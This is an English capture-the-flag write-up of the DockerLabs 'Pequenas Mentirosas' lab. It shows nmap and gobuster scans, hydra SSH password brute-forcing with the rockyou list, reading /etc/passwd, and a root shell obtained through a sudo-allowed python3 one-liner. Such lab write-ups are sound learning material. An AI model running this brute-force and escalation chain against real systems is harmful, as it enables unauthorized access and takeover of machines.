---
title: Pequenas Mentirosas
date: 2026-10-08
platform: DockerLabs
lang: en
difficulty: Easy
tags: [linux, web]
summary: Weak credentials. Escalation with python3's binary
---

- **IP:** 172.17.0.2
- **OS:** Linux
- **Difficulty:** Easy 

## Recon

Start with a nmap scan to see the ports open and the services running:
```bash
sudo nmap -p- -sV -sS -n -Pn -T4 -oN nmap-pequenas-mentirosas.txt 172.17.0.2
```

```bash
Nmap scan report for 172.17.0.2
Host is up (0.0000050s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.62 ((Debian))
MAC Address: 1E:E8:09:35:67:78 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

We see 2 services running:
- ssh
- http

We check for the web service running on port 80. The page is an empty site with a message: 

```
# Pista: Encuentra la clave para A en los archivos.
```

We can assume the existence of a user called "a".

## Enumeration

Scan with gobuster to find directories.
```bash
gobuster dir -u http://172.17.0.2 -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -x php,txt,html,js,bak -o gobuster-pequenas-mentirosas.txt
```

```bash
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.17.0.2
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Extensions:              bak,php,txt,html,js
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
index.html           (Status: 200) [Size: 85]
server-status        (Status: 403) [Size: 275]
Progress: 1323342 / 1323342 (100.00%)
===============================================================
Finished
===============================================================
```

Didn't find anything in the gobuster scan.

## Exploitation

With the clue of user "a", we try a brute-force attack with hydra.

```bash
hydra -l a -P /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt ssh://172.17.0.2
```

We obtain user "a"'s password and connect via ssh.

```bash
[DATA] attacking ssh://172.17.0.2:22/
[22][ssh] host: 172.17.0.2   login: a   password: secret
1 of 1 target successfully completed, 1 valid password found
```

```bash
ssh a@172.17.0.2
```

Once inside, we list directories and files, and check our privileges, but find nothing.

```bash
a@ce67418c9512:~$ ls -la
total 12
drwxr-xr-x 1 a    a      54 Sep 27  2024 .
drwxr-xr-x 1 root root    2 Sep 27  2024 ..
-rw-r--r-- 1 a    a     220 Mar 29  2024 .bash_logout
-rw-r--r-- 1 a    a    3526 Mar 29  2024 .bashrc
-rw-r--r-- 1 a    a     807 Mar 29  2024 .profile
```

```bash
a@ce67418c9512:~$ sudo -l                                                             
[sudo] password for a: 
Sorry, user a may not run sudo on ce67418c9512.
```

We read the "passwd" file to find another user with privileges, and find "spencer"

```bash
a@ce67418c9512:/$ ls -la /etc/passwd                                                  
-rw-r--r-- 1 root root 1165 Sep 27  2024 /etc/passwd
a@ce67418c9512:/$ cat /etc/passwd                                                     
root:x:0:0:root:/root:/bin/bash
...
...
spencer:x:1000:1000::/home/spencer:/bin/bash
a:x:1001:1001::/home/a:/bin/bash
```

With hydra try a brute-force attack and find the pass

```bash
hydra -l spencer -P /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt ssh://172.17.0.2
```

```bash
[DATA] attacking ssh://172.17.0.2:22/
[22][ssh] host: 172.17.0.2   login: spencer   password: password1
1 of 1 target successfully completed, 1 valid password found
```


## Privilege Escalation

We connect via ssh

```bash
ssh spencer@172.17.0.2
```

Once in, we check our privileges

```bash
spencer@ce67418c9512:~$ sudo -l                                                       
Matching Defaults entries for spencer on ce67418c9512:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    use_pty

User spencer may run the following commands on ce67418c9512:
    (ALL) NOPASSWD: /usr/bin/python3
```

We find that spencer can execute python3 without a password, so we spawn a shell and connect as root.

```bash
sudo python3 -c 'import os; os.execl("/bin/sh", "sh")'                               
# whoami                                                                        
root
```

## What to improve

1. Next time, after connecting via SSH, I should run `id` and `hostname`.
2. No usable directories found — only index.html and server-status (403, Apache status page not accessible) in the gobuster scan.